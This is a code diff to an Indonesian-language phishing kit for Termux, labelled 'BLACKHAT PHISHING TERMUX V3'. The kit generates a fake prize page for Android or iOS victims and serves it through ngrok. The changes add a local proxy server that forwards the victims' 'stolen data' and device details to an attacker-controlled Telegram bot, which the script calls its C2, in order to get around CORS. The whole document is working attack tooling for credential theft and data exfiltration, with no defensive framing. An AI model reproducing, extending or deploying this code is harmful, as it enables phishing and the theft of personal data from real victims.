@@ -7,6 +7,9 @@ import random
 import sys
 import requests
 from datetime import datetime
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import json
+import urllib.parse
 
 # Animasi UI Hollywood-style untuk Termux
 def hacker_ui():
@@ -24,13 +27,13 @@ def hacker_ui():
             sys.stdout.write("\033[H\033[J")  # Bersihkan layar
             print("\033[32m" + "🔥 BLACKHAT PHISHING TERMUX V3 🔥".center(80) + "\033[0m")
             print("\033[31m" + "═"*80 + "\033[0m")
-            for _ in range(6):  # Dikurangi untuk performa di Termux
+            for _ in range(6):
                 print("".join(random.choice(hacker_chars) for _ in range(80)))
             print("\033[31m" + "═"*80 + "\033[0m")
             print("\033[33m" + f"Status: {random.choice(hack_logs)}".center(80))
             print("\033[33m" + "Data akan masuk ke Telegram C2!".center(80))
             print("\033[31m" + "═"*80 + "\033[0m")
-            time.sleep(0.4)  # Sedikit lebih lambat untuk stabilitas
+            time.sleep(0.4)
     threading.Thread(target=animate, daemon=True).start()
 
 # Banner Keren
@@ -50,11 +53,22 @@ _  ____/_  /  ____/ /___/ / ____/ /
 """
     print(banner)
 
+# Validasi Telegram Bot Token
+def validate_telegram_token(bot_token):
+    try:
+        response = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe")
+        return response.status_code == 200
+    except:
+        return False
+
 # Input Konfigurasi
 def get_config():
     print("🔥 Masukkan konfigurasi, tuanku:")
     ngrok_authtoken = input("Masukkan Ngrok Authtoken: ")
     bot_token = input("Masukkan Telegram Bot Token: ")
+    if not validate_telegram_token(bot_token):
+        print("❌ Error: Telegram Bot Token tidak valid! Dapatkan token dari @BotFather.")
+        sys.exit(1)
     chat_id = input("Masukkan Telegram Chat ID: ")
     tinyurl_api = input("Masukkan TinyURL API Token (kosongkan jika tidak ada): ")
     return ngrok_authtoken, bot_token, chat_id, tinyurl_api
@@ -66,6 +80,37 @@ def show_menu():
     print("2. iOS")
     print("3. Keluar")
     return input("Pilih [1-3]: ")
+
+# Proxy Server untuk Bypass CORS
+class ProxyHandler(BaseHTTPRequestHandler):
+    def __init__(self, bot_token, chat_id, *args, **kwargs):
+        self.bot_token = bot_token
+        self.chat_id = chat_id
+        super().__init__(*args, **kwargs)
+    
+    def do_POST(self):
+        try:
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length).decode('utf-8')
+            data = json.loads(post_data)
+            
+            telegram_url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
+            response = requests.post(
+                telegram_url,
+                json={"chat_id": self.chat_id, "text": f"Target: {data['target']}\nData Curian:\n{json.dumps(data['stolenData'], indent=2)}"}
+            )
+            
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Access-Control-Allow-Origin", "*")
+            self.end_headers()
+            self.wfile.write(json.dumps({"status": "success" if response.status_code == 200 else "failed"}).encode('utf-8'))
+        except Exception as e:
+            self.send_response(500)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Access-Control-Allow-Origin", "*")
+            self.end_headers()
+            self.wfile.write(json.dumps({"error": str(e)}).encode('utf-8'))
 
 # Template HTML Phishing
 def generate_html(target, bot_token, chat_id):
@@ -248,19 +293,20 @@ def generate_html(target, bot_token, chat_id):
                     deviceInfo: deviceInfo
                 }};
 
-                const telegramUrl = `https://api.telegram.org/bot{bot_token}/sendMessage`;
-                await fetch(telegramUrl, {{
+                const proxyUrl = window.location.origin + '/send';
+                const response = await fetch(proxyUrl, {{
                     method: 'POST',
                     headers: {{ 'Content-Type': 'application/json' }},
-                    body: JSON.stringify({{
-                        chat_id: '{chat_id}',
-                        text: `Target: {target_name}\nData Curian:\n${{JSON.stringify(stolenData, null, 2)}}`
-                    }})
+                    body: JSON.stringify({{ target: '{target_name}', stolenData: stolenData }})
                 }});
 
                 document.getElementById('loader').style.display = 'none';
-                alert('Selamat! Hadiah Anda sedang diproses. Cek email Anda!');
-                window.location.href = 'https://google.com';
+                if (response.ok) {{
+                    alert('Selamat! Hadiah Anda sedang diproses. Cek email Anda!');
+                    window.location.href = 'https://google.com';
+                }} else {{
+                    throw new Error('Gagal mengirim data ke server proxy');
+                }}
             }} catch (error) {{
                 document.getElementById('loader').style.display = 'none';
                 console.error('Gagal mencuri:', error);
@@ -350,7 +396,12 @@ tunnels:
     with open("ngrok.yml", "w", encoding="utf-8") as f:
         f.write(ngrok_config)
     
-    # Jalankan server lokal
+    # Jalankan server proxy di port 8000
+    proxy_server = HTTPServer(('localhost', 8000), lambda *args, **kwargs: ProxyHandler(bot_token, chat_id, *args, **kwargs))
+    proxy_thread = threading.Thread(target=proxy_server.serve_forever, daemon=True)
+    proxy_thread.start()
+    
+    # Jalankan server lokal untuk halaman phishing
     try:
         server_process = subprocess.Popen(["python3", "-m", "http.server", "8080"], cwd="phishing_site")
     except FileNotFoundError:
@@ -361,6 +412,7 @@ tunnels:
     ngrok_executable = "ngrok"
     if not shutil.which(ngrok_executable):
         print("❌ Error: Ngrok tidak ditemukan! Jalankan 'pkg install ngrok' di Termux.")
+        proxy_server.shutdown()
         sys.exit(1)
     
     # Jalankan Ngrok
@@ -368,6 +420,7 @@ tunnels:
         ngrok_process = subprocess.Popen([ngrok_executable, "start", "--config", "../ngrok.yml", "phishing"])
     except FileNotFoundError:
         print("❌ Error: Ngrok executable tidak ditemukan. Pastikan Ngrok terinstall.")
+        proxy_server.shutdown()
         server_process.terminate()
         sys.exit(1)
     
@@ -389,6 +442,7 @@ tunnels:
         print("⏳ Menunggu target mengklik... Data akan masuk ke bot Telegram!")
     else:
         print("❌ Gagal mendapatkan URL Ngrok. Pastikan Ngrok berjalan dan authtoken valid!")
+        proxy_server.shutdown()
         server_process.terminate()
         ngrok_process.terminate()
         sys.exit(1)
@@ -397,21 +451,21 @@ tunnels:
     def monitor_processes():
         while server_process.poll() is None and ngrok_process.poll() is None:
             time.sleep(1)
-        if server_process.poll() is not None:
-            print("❌ Server lokal mati! Menghentikan operasi...")
-            ngrok_process.terminate()
-        if ngrok_process.poll() is not None:
-            print("❌ Ngrok mati! Menghentikan operasi...")
+        if server_process.poll() is None:
             server_process.terminate()
+        if ngrok_process.poll() is None:
+            ngrok_process.terminate()
+        proxy_server.shutdown()
+        print("❌ Salah satu proses mati! Menghentikan operasi...")
     
     threading.Thread(target=monitor_processes, daemon=True).start()
-    return server_process, ngrok_process
+    return server_process, ngrok_process, proxy_server
 
 # Main Program
 def main():
     # Pengecekan dependensi di Termux
     print("🔍 Mengecek dependensi...")
-    for pkg in ["python", "curl"]:
+    for pkg in ["python", "curl", "ngrok"]:
         if not shutil.which(pkg):
             print(f"❌ Error: {pkg} tidak ditemukan. Jalankan 'pkg install {pkg}' di Termux.")
             sys.exit(1)
@@ -423,13 +477,14 @@ def main():
         choice = show_menu()
         if choice == "1" or choice == "2":
             print(f"\n🔨 Membuat halaman phishing untuk {'Android' if choice == '1' else 'iOS'}...")
-            server_process, ngrok_process = setup_phishing(choice, ngrok_authtoken, bot_token, chat_id, tinyurl_api)
+            server_process, ngrok_process, proxy_server = setup_phishing(choice, ngrok_authtoken, bot_token, chat_id, tinyurl_api)
             hacker_ui()
             try:
                 input("\n😈 Tekan Enter untuk menghentikan server dan keluar...")
             finally:
                 server_process.terminate()
                 ngrok_process.terminate()
+                proxy_server.shutdown()
                 shutil.rmtree("phishing_site", ignore_errors=True)
                 if os.path.exists("ngrok.yml"):
                     os.remove("ngrok.yml")
